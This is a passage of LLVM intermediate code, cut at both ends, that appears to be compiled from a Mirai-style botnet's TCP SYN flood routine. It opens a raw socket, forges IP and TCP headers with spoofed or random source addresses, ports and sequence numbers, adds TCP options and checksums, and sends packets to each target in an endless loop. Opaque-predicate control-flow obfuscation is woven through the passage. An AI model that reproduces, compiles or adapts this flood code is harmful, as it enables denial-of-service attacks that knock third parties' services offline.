  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %549

; <label>:99:                                     ; preds = %4
  %100 = load i32, i32* @x.47
  %101 = load i32, i32* @y.48
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %99
  store i32 1, i32* %9, align 4
  %108 = load i32, i32* %10, align 4
  %109 = bitcast i32* %9 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp eq i32 %110, -1
  %112 = load i32, i32* @x.47
  %113 = load i32, i32* @y.48
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %111, label %120, label %123

; <label>:120:                                    ; preds = %originalBBpart2
  %121 = load i32, i32* %10, align 4
  %122 = call i32 @close(i32 %121)
  br label %549

; <label>:123:                                    ; preds = %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %124

; <label>:124:                                    ; preds = %301, %123
  %125 = load i32, i32* %9, align 4
  %126 = load i8, i8* %5, align 1
  %127 = zext i8 %126 to i32
  %128 = icmp slt i32 %125, %127
  br i1 %128, label %129, label %304

; <label>:129:                                    ; preds = %124
  %130 = call noalias i8* @calloc(i64 128, i64 1) #6
  %131 = load i8**, i8*** %11, align 8
  %132 = load i32, i32* %9, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8*, i8** %131, i64 %133
  store i8* %130, i8** %134, align 8
  %135 = load i8**, i8*** %11, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  %139 = load i8*, i8** %138, align 8
  %140 = bitcast i8* %139 to %struct.iphdr*
  store %struct.iphdr* %140, %struct.iphdr** %27, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i64 1
  %143 = bitcast %struct.iphdr* %142 to %struct.tcphdr*
  store %struct.tcphdr* %143, %struct.tcphdr** %28, align 8
  %144 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i64 1
  %146 = bitcast %struct.tcphdr* %145 to i8*
  store i8* %146, i8** %29, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = load i8, i8* %148, align 4
  %150 = and i8 %149, 15
  %151 = or i8 %150, 64
  store i8 %151, i8* %148, align 4
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = load i8, i8* %153, align 4
  %155 = and i8 %154, -16
  %156 = or i8 %155, 5
  store i8 %156, i8* %153, align 4
  %157 = load i8, i8* %12, align 1
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 1
  store i8 %157, i8* %159, align 1
  %160 = call zeroext i16 @htons(i16 zeroext 60) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 2
  store i16 %160, i16* %162, align 2
  %163 = load i16, i16* %13, align 2
  %164 = call zeroext i16 @htons(i16 zeroext %163) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 3
  store i16 %164, i16* %166, align 4
  %167 = load i8, i8* %14, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 5
  store i8 %167, i8* %169, align 4
  %170 = load i8, i8* %15, align 1
  %171 = icmp ne i8 %170, 0
  br i1 %171, label %172, label %176

; <label>:172:                                    ; preds = %129
  %173 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 4
  store i16 %173, i16* %175, align 2
  br label %176

; <label>:176:                                    ; preds = %172, %129
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 6
  store i8 6, i8* %178, align 1
  %179 = load i32, i32* %26, align 4
  %180 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 8
  store i32 %179, i32* %181, align 4
  %182 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %183 = load i32, i32* %9, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i32 0, i32 1
  %187 = load i32, i32* %186, align 4
  %188 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 9
  store i32 %187, i32* %189, align 4
  %190 = load i16, i16* %16, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 0
  store i16 %191, i16* %193, align 4
  %194 = load i16, i16* %17, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 1
  store i16 %195, i16* %197, align 2
  %198 = load i32, i32* %18, align 4
  %199 = trunc i32 %198 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = zext i16 %200 to i32
  %202 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 2
  store i32 %201, i32* %203, align 4
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %206, -241
  %208 = or i16 %207, 160
  store i16 %208, i16* %205, align 4
  %209 = load i8, i8* %20, align 1
  %210 = sext i8 %209 to i16
  %211 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %212 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %211, i32 0, i32 4
  %213 = load i16, i16* %212, align 4
  %214 = and i16 %210, 1
  %215 = shl i16 %214, 13
  %216 = and i16 %213, -8193
  %217 = or i16 %216, %215
  store i16 %217, i16* %212, align 4
  %218 = load i8, i8* %21, align 1
  %219 = sext i8 %218 to i16
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = and i16 %219, 1
  %224 = shl i16 %223, 12
  %225 = and i16 %222, -4097
  %226 = or i16 %225, %224
  store i16 %226, i16* %221, align 4
  %227 = load i8, i8* %22, align 1
  %228 = sext i8 %227 to i16
  %229 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 4
  %231 = load i16, i16* %230, align 4
  %232 = and i16 %228, 1
  %233 = shl i16 %232, 11
  %234 = and i16 %231, -2049
  %235 = or i16 %234, %233
  store i16 %235, i16* %230, align 4
  %236 = load i8, i8* %23, align 1
  %237 = sext i8 %236 to i16
  %238 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = and i16 %237, 1
  %242 = shl i16 %241, 10
  %243 = and i16 %240, -1025
  %244 = or i16 %243, %242
  store i16 %244, i16* %239, align 4
  %245 = load i8, i8* %24, align 1
  %246 = sext i8 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 4
  %249 = load i16, i16* %248, align 4
  %250 = and i16 %246, 1
  %251 = shl i16 %250, 9
  %252 = and i16 %249, -513
  %253 = or i16 %252, %251
  store i16 %253, i16* %248, align 4
  %254 = load i8, i8* %25, align 1
  %255 = sext i8 %254 to i16
  %256 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %257 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %256, i32 0, i32 4
  %258 = load i16, i16* %257, align 4
  %259 = and i16 %255, 1
  %260 = shl i16 %259, 8
  %261 = and i16 %258, -257
  %262 = or i16 %261, %260
  store i16 %262, i16* %257, align 4
  %263 = load i8*, i8** %29, align 8
  %264 = getelementptr inbounds i8, i8* %263, i32 1
  store i8* %264, i8** %29, align 8
  store i8 2, i8* %263, align 1
  %265 = load i8*, i8** %29, align 8
  %266 = getelementptr inbounds i8, i8* %265, i32 1
  store i8* %266, i8** %29, align 8
  store i8 4, i8* %265, align 1
  %267 = call i32 @rand_next()
  %268 = and i32 %267, 15
  %269 = add i32 1400, %268
  %270 = trunc i32 %269 to i16
  %271 = call zeroext i16 @htons(i16 zeroext %270) #7
  %272 = load i8*, i8** %29, align 8
  %273 = bitcast i8* %272 to i16*
  store i16 %271, i16* %273, align 2
  %274 = load i8*, i8** %29, align 8
  %275 = getelementptr inbounds i8, i8* %274, i64 2
  store i8* %275, i8** %29, align 8
  %276 = load i8*, i8** %29, align 8
  %277 = getelementptr inbounds i8, i8* %276, i32 1
  store i8* %277, i8** %29, align 8
  store i8 4, i8* %276, align 1
  %278 = load i8*, i8** %29, align 8
  %279 = getelementptr inbounds i8, i8* %278, i32 1
  store i8* %279, i8** %29, align 8
  store i8 2, i8* %278, align 1
  %280 = load i8*, i8** %29, align 8
  %281 = getelementptr inbounds i8, i8* %280, i32 1
  store i8* %281, i8** %29, align 8
  store i8 8, i8* %280, align 1
  %282 = load i8*, i8** %29, align 8
  %283 = getelementptr inbounds i8, i8* %282, i32 1
  store i8* %283, i8** %29, align 8
  store i8 10, i8* %282, align 1
  %284 = call i32 @rand_next()
  %285 = load i8*, i8** %29, align 8
  %286 = bitcast i8* %285 to i32*
  store i32 %284, i32* %286, align 4
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i64 4
  store i8* %288, i8** %29, align 8
  %289 = load i8*, i8** %29, align 8
  %290 = bitcast i8* %289 to i32*
  store i32 0, i32* %290, align 4
  %291 = load i8*, i8** %29, align 8
  %292 = getelementptr inbounds i8, i8* %291, i64 4
  store i8* %292, i8** %29, align 8
  %293 = load i8*, i8** %29, align 8
  %294 = getelementptr inbounds i8, i8* %293, i32 1
  store i8* %294, i8** %29, align 8
  store i8 1, i8* %293, align 1
  %295 = load i8*, i8** %29, align 8
  %296 = getelementptr inbounds i8, i8* %295, i32 1
  store i8* %296, i8** %29, align 8
  store i8 3, i8* %295, align 1
  %297 = load i8*, i8** %29, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %29, align 8
  store i8 3, i8* %297, align 1
  %299 = load i8*, i8** %29, align 8
  %300 = getelementptr inbounds i8, i8* %299, i32 1
  store i8* %300, i8** %29, align 8
  store i8 6, i8* %299, align 1
  br label %301

; <label>:301:                                    ; preds = %176
  %302 = load i32, i32* %9, align 4
  %303 = add nsw i32 %302, 1
  store i32 %303, i32* %9, align 4
  br label %124

; <label>:304:                                    ; preds = %124
  br label %305

; <label>:305:                                    ; preds = %548, %304
  store i32 0, i32* %9, align 4
  br label %306

; <label>:306:                                    ; preds = %originalBBpart246, %305
  %307 = load i32, i32* %9, align 4
  %308 = load i8, i8* %5, align 1
  %309 = zext i8 %308 to i32
  %310 = icmp slt i32 %307, %309
  br i1 %310, label %311, label %548

; <label>:311:                                    ; preds = %306
  %312 = load i8**, i8*** %11, align 8
  %313 = load i32, i32* %9, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds i8*, i8** %312, i64 %314
  %316 = load i8*, i8** %315, align 8
  store i8* %316, i8** %30, align 8
  %317 = load i8*, i8** %30, align 8
  %318 = bitcast i8* %317 to %struct.iphdr*
  store %struct.iphdr* %318, %struct.iphdr** %31, align 8
  %319 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i64 1
  %321 = bitcast %struct.iphdr* %320 to %struct.tcphdr*
  store %struct.tcphdr* %321, %struct.tcphdr** %32, align 8
  %322 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %323 = load i32, i32* %9, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i64 %324
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %325, i32 0, i32 2
  %327 = load i8, i8* %326, align 4
  %328 = zext i8 %327 to i32
  %329 = icmp slt i32 %328, 32
  br i1 %329, label %330, label %351

; <label>:330:                                    ; preds = %311
  %331 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %332 = load i32, i32* %9, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %331, i64 %333
  %335 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %334, i32 0, i32 1
  %336 = load i32, i32* %335, align 4
  %337 = call i32 @ntohl(i32 %336) #7
  %338 = call i32 @rand_next()
  %339 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %340 = load i32, i32* %9, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %339, i64 %341
  %343 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %342, i32 0, i32 2
  %344 = load i8, i8* %343, align 4
  %345 = zext i8 %344 to i32
  %346 = lshr i32 %338, %345
  %347 = add i32 %337, %346
  %348 = call i32 @htonl(i32 %347) #7
  %349 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 9
  store i32 %348, i32* %350, align 4
  br label %351

; <label>:351:                                    ; preds = %330, %311
  %352 = load i32, i32* @x.47
  %353 = load i32, i32* @y.48
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %351
  %360 = load i32, i32* %26, align 4
  %361 = icmp eq i32 %360, -1
  %362 = load i32, i32* @x.47
  %363 = load i32, i32* @y.48
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %361, label %370, label %374

; <label>:370:                                    ; preds = %originalBBpart24
  %371 = call i32 @rand_next()
  %372 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %373 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %372, i32 0, i32 8
  store i32 %371, i32* %373, align 4
  br label %374

; <label>:374:                                    ; preds = %370, %originalBBpart24
  %375 = load i16, i16* %13, align 2
  %376 = zext i16 %375 to i32
  %377 = icmp eq i32 %376, 65535
  br i1 %377, label %378, label %384

; <label>:378:                                    ; preds = %374
  %379 = call i32 @rand_next()
  %380 = and i32 %379, 65535
  %381 = trunc i32 %380 to i16
  %382 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 3
  store i16 %381, i16* %383, align 4
  br label %384

; <label>:384:                                    ; preds = %378, %374
  %385 = load i16, i16* %16, align 2
  %386 = zext i16 %385 to i32
  %387 = icmp eq i32 %386, 65535
  br i1 %387, label %388, label %410

; <label>:388:                                    ; preds = %384
  %389 = load i32, i32* @x.47
  %390 = load i32, i32* @y.48
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %388
  %397 = call i32 @rand_next()
  %398 = and i32 %397, 65535
  %399 = trunc i32 %398 to i16
  %400 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %401 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %400, i32 0, i32 0
  store i16 %399, i16* %401, align 4
  %402 = load i32, i32* @x.47
  %403 = load i32, i32* @y.48
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBBpart216, label %originalBB6alteredBB

originalBBpart216:                                ; preds = %originalBB6
  br label %410

; <label>:410:                                    ; preds = %originalBBpart216, %384
  %411 = load i16, i16* %17, align 2
  %412 = zext i16 %411 to i32
  %413 = icmp eq i32 %412, 65535
  br i1 %413, label %414, label %436

; <label>:414:                                    ; preds = %410
  %415 = load i32, i32* @x.47
  %416 = load i32, i32* @y.48
  %417 = sub i32 %415, 1
  %418 = mul i32 %415, %417
  %419 = urem i32 %418, 2
  %420 = icmp eq i32 %419, 0
  %421 = icmp slt i32 %416, 10
  %422 = or i1 %420, %421
  br i1 %422, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %414
  %423 = call i32 @rand_next()
  %424 = and i32 %423, 65535
  %425 = trunc i32 %424 to i16
  %426 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 1
  store i16 %425, i16* %427, align 2
  %428 = load i32, i32* @x.47
  %429 = load i32, i32* @y.48
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br label %436

; <label>:436:                                    ; preds = %originalBBpart227, %410
  %437 = load i32, i32* @x.47
  %438 = load i32, i32* @y.48
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %436
  %445 = load i32, i32* %18, align 4
  %446 = icmp eq i32 %445, 65535
  %447 = load i32, i32* @x.47
  %448 = load i32, i32* @y.48
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %446, label %455, label %459

; <label>:455:                                    ; preds = %originalBBpart231
  %456 = call i32 @rand_next()
  %457 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %458 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %457, i32 0, i32 2
  store i32 %456, i32* %458, align 4
  br label %459

; <label>:459:                                    ; preds = %455, %originalBBpart231
  %460 = load i32, i32* %19, align 4
  %461 = icmp eq i32 %460, 65535
  br i1 %461, label %462, label %466

; <label>:462:                                    ; preds = %459
  %463 = call i32 @rand_next()
  %464 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 3
  store i32 %463, i32* %465, align 4
  br label %466

; <label>:466:                                    ; preds = %462, %459
  %467 = load i32, i32* @x.47
  %468 = load i32, i32* @y.48
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %466
  %475 = load i8, i8* %20, align 1
  %476 = icmp ne i8 %475, 0
  %477 = load i32, i32* @x.47
  %478 = load i32, i32* @y.48
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %476, label %485, label %491

; <label>:485:                                    ; preds = %originalBBpart235
  %486 = call i32 @rand_next()
  %487 = and i32 %486, 65535
  %488 = trunc i32 %487 to i16
  %489 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 7
  store i16 %488, i16* %490, align 2
  br label %491

; <label>:491:                                    ; preds = %485, %originalBBpart235
  %492 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 7
  store i16 0, i16* %493, align 2
  %494 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %495 = bitcast %struct.iphdr* %494 to i16*
  %496 = call zeroext i16 @checksum_generic(i16* %495, i32 20)
  %497 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %498 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %497, i32 0, i32 7
  store i16 %496, i16* %498, align 2
  %499 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %500 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %499, i32 0, i32 6
  store i16 0, i16* %500, align 4
  %501 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %502 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %503 = bitcast %struct.tcphdr* %502 to i8*
  %504 = call zeroext i16 @htons(i16 zeroext 40) #7
  %505 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %501, i8* %503, i16 zeroext %504, i32 40)
  %506 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %507 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %506, i32 0, i32 6
  store i16 %505, i16* %507, align 4
  %508 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %509 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %508, i32 0, i32 1
  %510 = load i16, i16* %509, align 2
  %511 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %512 = load i32, i32* %9, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %511, i64 %513
  %515 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %514, i32 0, i32 0
  %516 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %515, i32 0, i32 1
  store i16 %510, i16* %516, align 2
  %517 = load i32, i32* %10, align 4
  %518 = load i8*, i8** %30, align 8
  %519 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %520 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %520, i64 %522
  %524 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %523, i32 0, i32 0
  %525 = bitcast %struct.sockaddr_in* %524 to %struct.sockaddr*
  store %struct.sockaddr* %525, %struct.sockaddr** %519, align 8
  %526 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %527 = load %struct.sockaddr*, %struct.sockaddr** %526, align 8
  %528 = call i64 @sendto(i32 %517, i8* %518, i64 60, i32 16384, %struct.sockaddr* %527, i32 16)
  br label %529

; <label>:529:                                    ; preds = %491
  %530 = load i32, i32* @x.47
  %531 = load i32, i32* @y.48
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %529
  %538 = load i32, i32* %9, align 4
  %539 = add nsw i32 %538, 1
  store i32 %539, i32* %9, align 4
  %540 = load i32, i32* @x.47
  %541 = load i32, i32* @y.48
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBBpart246, label %originalBB37alteredBB

originalBBpart246:                                ; preds = %originalBB37
  br label %306

; <label>:548:                                    ; preds = %306
  br label %305

; <label>:549:                                    ; preds = %120, %98
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %99
  store i32 1, i32* %9, align 4
  %550 = load i32, i32* %10, align 4
  %551 = bitcast i32* %9 to i8*
  %552 = call i32 @setsockopt(i32 %550, i32 0, i32 3, i8* %551, i32 4) #6
  %553 = icmp eq i32 %552, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %351
  %554 = load i32, i32* %26, align 4
  %555 = icmp eq i32 %554, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %388
  %556 = call i32 @rand_next()
  %_ = shl i32 %556, 65535
  %_7 = sub i32 %556, 65535
  %gen = mul i32 %_7, 65535
  %_8 = sub i32 0, %556
  %gen9 = add i32 %_8, 65535
  %_10 = sub i32 0, %556
